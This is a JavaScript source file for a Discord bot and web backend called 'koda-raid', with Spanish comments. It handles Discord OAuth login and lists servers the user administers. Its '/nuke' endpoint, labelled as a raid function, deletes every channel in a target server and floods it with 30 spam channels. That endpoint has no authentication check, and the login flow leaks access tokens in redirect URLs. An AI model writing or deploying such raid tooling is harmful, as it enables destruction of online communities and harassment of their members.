const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(cors());
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

const CLIENT_ID = '1469577414022795346'; 
const CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
const REDIRECT_URI = 'https://koda-raid.onrender.com/auth/callback';

// Login: Redirige a Discord
app.get('/login', (req, res) => {
    const url = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds`;
    res.redirect(url);
});

// Callback: Recibe el token del usuario
app.get('/auth/callback', async (req, res) => {
    try {
        const code = req.query.code;
        const response = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID, client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code', code, redirect_uri: REDIRECT_URI
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        // Regresa a Vercel con el token (Cambia esta URL por la tuya de Vercel)
        res.redirect(`https://koda-raid.vercel.app/?token=${response.data.access_token}`);
    } catch (e) { res.send("Error en login"); }
});

// Obtener servidores mutuos (User Admin + Bot Present)
app.get('/api/servers', async (req, res) => {
    const token = req.headers.authorization;
    try {
        const userGuilds = await axios.get('https://discord.com/api/users/@me/guilds', {
            headers: { Authorization: token }
        });
        
        const botGuildIds = client.guilds.cache.map(g => g.id);
        const mutual = userGuilds.data.filter(g => (g.permissions & 0x8) === 0x8 && botGuildIds.includes(g.id));
        
        res.json(mutual);
    } catch (e) { res.status(500).send("Error"); }
});

// Función de Raid
app.get('/nuke', async (req, res) => {
    const { guildId } = req.query;
    const guild = client.guilds.cache.get(guildId);
    if (!guild) return res.status(404).send("Bot no está ahí");

    const channels = await guild.channels.fetch();
    for (const c of channels.values()) await c.delete().catch(() => {});
    
    for (let i = 0; i < 30; i++) {
        setTimeout(() => guild.channels.create({ name: 'koda-raid', type: 0 }).catch(() => {}), i * 400);
    }
    res.send("Raid iniciado");
});

client.login(process.env.DISCORD_TOKEN);
app.listen(process.env.PORT || 3000);